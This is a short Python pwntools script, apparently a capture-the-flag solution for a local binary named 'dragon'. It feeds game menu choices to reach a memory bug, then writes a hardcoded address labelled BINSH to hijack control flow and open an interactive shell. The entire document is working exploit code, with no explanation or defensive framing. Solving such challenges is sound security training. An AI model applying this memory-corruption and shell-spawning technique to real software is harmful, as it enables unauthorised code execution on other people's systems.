from pwn import *

BINSH = 0x08048DBF

conn = process("./dragon")

conn.writeline("1") # Choose priest
for _ in xrange(2):
    conn.writeline("1") # Holy Bolt

conn.writeline("1") # Choose priest
for _ in xrange(4):
    conn.writeline("3") # HolyShield
    conn.writeline("3") # HolyShield
    conn.writeline("2") # Clarity

conn.writeline(p32(BINSH))

conn.interactive()
